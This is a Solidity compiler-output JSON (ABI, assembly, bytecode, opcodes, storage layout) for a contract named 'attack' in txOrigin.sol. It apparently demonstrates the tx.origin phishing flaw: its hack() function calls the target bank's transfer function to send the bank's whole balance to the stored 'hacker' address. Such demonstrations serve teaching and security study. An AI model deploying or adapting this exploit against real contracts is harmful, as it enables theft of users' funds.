{
	"contracts/txOrigin.sol": {
		"attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract TXOrigin",
							"name": "_bank",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "hack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "hacker",
					"outputs": [
						{
							"internalType": "address payable",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/txOrigin.sol\":652:921  contract attack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/txOrigin.sol\":729:834  constructor(TXOrigin _bank) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/txOrigin.sol\":783:788  _bank */\n  dup1\n    /* \"contracts/txOrigin.sol\":767:771  bank */\n  0x01\n  0x00\n    /* \"contracts/txOrigin.sol\":767:789  bank = TXOrigin(_bank) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/txOrigin.sol\":816:826  msg.sender */\n  caller\n    /* \"contracts/txOrigin.sol\":799:805  hacker */\n  0x00\n  dup1\n    /* \"contracts/txOrigin.sol\":799:827  hacker = payable(msg.sender) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/txOrigin.sol\":729:834  constructor(TXOrigin _bank) {... */\n  pop\n    /* \"contracts/txOrigin.sol\":652:921  contract attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:679   */\ntag_12:\n    /* \"#utility.yul\":620:627   */\n  0x00\n    /* \"#utility.yul\":649:673   */\n  tag_23\n    /* \"#utility.yul\":667:672   */\n  dup3\n    /* \"#utility.yul\":649:673   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":638:673   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:679   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":685:837   */\ntag_13:\n    /* \"#utility.yul\":773:812   */\n  tag_25\n    /* \"#utility.yul\":806:811   */\n  dup2\n    /* \"#utility.yul\":773:812   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":766:771   */\n  dup2\n    /* \"#utility.yul\":763:813   */\n  eq\n    /* \"#utility.yul\":753:831   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":827:828   */\n  0x00\n    /* \"#utility.yul\":824:825   */\n  dup1\n    /* \"#utility.yul\":817:829   */\n  revert\n    /* \"#utility.yul\":753:831   */\ntag_26:\n    /* \"#utility.yul\":685:837   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":843:1016   */\ntag_14:\n    /* \"#utility.yul\":915:920   */\n  0x00\n    /* \"#utility.yul\":946:952   */\n  dup2\n    /* \"#utility.yul\":940:953   */\n  mload\n    /* \"#utility.yul\":931:953   */\n  swap1\n  pop\n    /* \"#utility.yul\":962:1010   */\n  tag_28\n    /* \"#utility.yul\":1004:1009   */\n  dup2\n    /* \"#utility.yul\":962:1010   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":843:1016   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1022:1403   */\ntag_3:\n    /* \"#utility.yul\":1107:1113   */\n  0x00\n    /* \"#utility.yul\":1156:1158   */\n  0x20\n    /* \"#utility.yul\":1144:1153   */\n  dup3\n    /* \"#utility.yul\":1135:1142   */\n  dup5\n    /* \"#utility.yul\":1131:1154   */\n  sub\n    /* \"#utility.yul\":1127:1159   */\n  slt\n    /* \"#utility.yul\":1124:1243   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1162:1241   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1124:1243   */\ntag_30:\n    /* \"#utility.yul\":1282:1283   */\n  0x00\n    /* \"#utility.yul\":1307:1386   */\n  tag_32\n    /* \"#utility.yul\":1378:1385   */\n  dup5\n    /* \"#utility.yul\":1369:1375   */\n  dup3\n    /* \"#utility.yul\":1358:1367   */\n  dup6\n    /* \"#utility.yul\":1354:1376   */\n  add\n    /* \"#utility.yul\":1307:1386   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1297:1386   */\n  swap2\n  pop\n    /* \"#utility.yul\":1253:1396   */\n  pop\n    /* \"#utility.yul\":1022:1403   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/txOrigin.sol\":652:921  contract attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/txOrigin.sol\":652:921  contract attack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x38d1af2d\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x4de260a2\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/txOrigin.sol\":674:703  address payable public hacker */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/txOrigin.sol\":840:919  function hack() public {... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contracts/txOrigin.sol\":674:703  address payable public hacker */\n    tag_6:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/txOrigin.sol\":840:919  function hack() public {... */\n    tag_10:\n        /* \"contracts/txOrigin.sol\":873:877  bank */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/txOrigin.sol\":873:881  bank.tra */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x69a3f230\n        /* \"contracts/txOrigin.sol\":882:888  hacker */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/txOrigin.sol\":898:902  bank */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/txOrigin.sol\":890:911  address(bank).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/txOrigin.sol\":873:912  bank.tra(hacker, address(bank).balance) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_12\n      swap3\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/txOrigin.sol\":840:919  function hack() public {... */\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_17:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:243   */\n    tag_18:\n        /* \"#utility.yul\":184:191   */\n      0x00\n        /* \"#utility.yul\":213:237   */\n      tag_25\n        /* \"#utility.yul\":231:236   */\n      dup3\n        /* \"#utility.yul\":213:237   */\n      tag_17\n      jump\t// in\n    tag_25:\n        /* \"#utility.yul\":202:237   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:243   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":249:391   */\n    tag_19:\n        /* \"#utility.yul\":352:384   */\n      tag_27\n        /* \"#utility.yul\":378:383   */\n      dup2\n        /* \"#utility.yul\":352:384   */\n      tag_18\n      jump\t// in\n    tag_27:\n        /* \"#utility.yul\":347:350   */\n      dup3\n        /* \"#utility.yul\":340:385   */\n      mstore\n        /* \"#utility.yul\":249:391   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":397:651   */\n    tag_8:\n        /* \"#utility.yul\":506:510   */\n      0x00\n        /* \"#utility.yul\":544:546   */\n      0x20\n        /* \"#utility.yul\":533:542   */\n      dup3\n        /* \"#utility.yul\":529:547   */\n      add\n        /* \"#utility.yul\":521:547   */\n      swap1\n      pop\n        /* \"#utility.yul\":557:644   */\n      tag_29\n        /* \"#utility.yul\":641:642   */\n      0x00\n        /* \"#utility.yul\":630:639   */\n      dup4\n        /* \"#utility.yul\":626:643   */\n      add\n        /* \"#utility.yul\":617:623   */\n      dup5\n        /* \"#utility.yul\":557:644   */\n      tag_19\n      jump\t// in\n    tag_29:\n        /* \"#utility.yul\":397:651   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":657:734   */\n    tag_20:\n        /* \"#utility.yul\":694:701   */\n      0x00\n        /* \"#utility.yul\":723:728   */\n      dup2\n        /* \"#utility.yul\":712:728   */\n      swap1\n      pop\n        /* \"#utility.yul\":657:734   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":740:858   */\n    tag_21:\n        /* \"#utility.yul\":827:851   */\n      tag_32\n        /* \"#utility.yul\":845:850   */\n      dup2\n        /* \"#utility.yul\":827:851   */\n      tag_20\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":822:825   */\n      dup3\n        /* \"#utility.yul\":815:852   */\n      mstore\n        /* \"#utility.yul\":740:858   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":864:1228   */\n    tag_13:\n        /* \"#utility.yul\":1001:1005   */\n      0x00\n        /* \"#utility.yul\":1039:1041   */\n      0x40\n        /* \"#utility.yul\":1028:1037   */\n      dup3\n        /* \"#utility.yul\":1024:1042   */\n      add\n        /* \"#utility.yul\":1016:1042   */\n      swap1\n      pop\n        /* \"#utility.yul\":1052:1139   */\n      tag_34\n        /* \"#utility.yul\":1136:1137   */\n      0x00\n        /* \"#utility.yul\":1125:1134   */\n      dup4\n        /* \"#utility.yul\":1121:1138   */\n      add\n        /* \"#utility.yul\":1112:1118   */\n      dup6\n        /* \"#utility.yul\":1052:1139   */\n      tag_19\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":1149:1221   */\n      tag_35\n        /* \"#utility.yul\":1217:1219   */\n      0x20\n        /* \"#utility.yul\":1206:1215   */\n      dup4\n        /* \"#utility.yul\":1202:1220   */\n      add\n        /* \"#utility.yul\":1193:1199   */\n      dup5\n        /* \"#utility.yul\":1149:1221   */\n      tag_21\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":864:1228   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220bc702c17505bad9e36691960c1a8ea9cfaa148696d097010fbda4f3e7acf8ade64736f6c63430008120033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506040516103af3803806103af8339818101604052810190610032919061012e565b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061015b565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b60006100fb826100de565b9050919050565b61010b816100f0565b811461011657600080fd5b50565b60008151905061012881610102565b92915050565b600060208284031215610144576101436100b9565b5b600061015284828501610119565b91505092915050565b6102458061016a6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806338d1af2d1461003b5780634de260a214610059575b600080fd5b610043610063565b60405161005091906101b2565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166369a3f23060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16316040518363ffffffff1660e01b815260040161013d9291906101e6565b600060405180830381600087803b15801561015757600080fd5b505af115801561016b573d6000803e3d6000fd5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061019c82610171565b9050919050565b6101ac81610191565b82525050565b60006020820190506101c760008301846101a3565b92915050565b6000819050919050565b6101e0816101cd565b82525050565b60006040820190506101fb60008301856101a3565b61020860208301846101d7565b939250505056fea2646970667358221220bc702c17505bad9e36691960c1a8ea9cfaa148696d097010fbda4f3e7acf8ade64736f6c63430008120033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x3AF CODESIZE SUB DUP1 PUSH2 0x3AF DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x12E JUMP JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x15B JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE9 DUP3 PUSH2 0xBE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xFB DUP3 PUSH2 0xDE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x10B DUP2 PUSH2 0xF0 JUMP JUMPDEST DUP2 EQ PUSH2 0x116 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x128 DUP2 PUSH2 0x102 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x144 JUMPI PUSH2 0x143 PUSH2 0xB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x152 DUP5 DUP3 DUP6 ADD PUSH2 0x119 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x245 DUP1 PUSH2 0x16A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x38D1AF2D EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x1B2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x69A3F230 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x13D SWAP3 SWAP2 SWAP1 PUSH2 0x1E6 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x157 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x16B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x19C DUP3 PUSH2 0x171 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1AC DUP2 PUSH2 0x191 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1C7 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1A3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1E0 DUP2 PUSH2 0x1CD JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x1FB PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x1A3 JUMP JUMPDEST PUSH2 0x208 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x1D7 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xBC PUSH17 0x2C17505BAD9E36691960C1A8EA9CFAA148 PUSH10 0x6D097010FBDA4F3E7ACF DUP11 0xDE PUSH5 0x736F6C6343 STOP ADDMOD SLT STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "116200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"hack()": "infinite",
						"hacker()": "2489"
					}
				},
				"methodIdentifiers": {
					"hack()": "4de260a2",
					"hacker()": "38d1af2d"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 45,
						"contract": "contracts/txOrigin.sol:attack",
						"label": "hacker",
						"offset": 0,
						"slot": "0",
						"type": "t_address_payable"
					},
					{
						"astId": 48,
						"contract": "contracts/txOrigin.sol:attack",
						"label": "bank",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(TXOrigin)43"
					}
				],
				"types": {
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					},
					"t_contract(TXOrigin)43": {
						"encoding": "inplace",
						"label": "contract TXOrigin",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}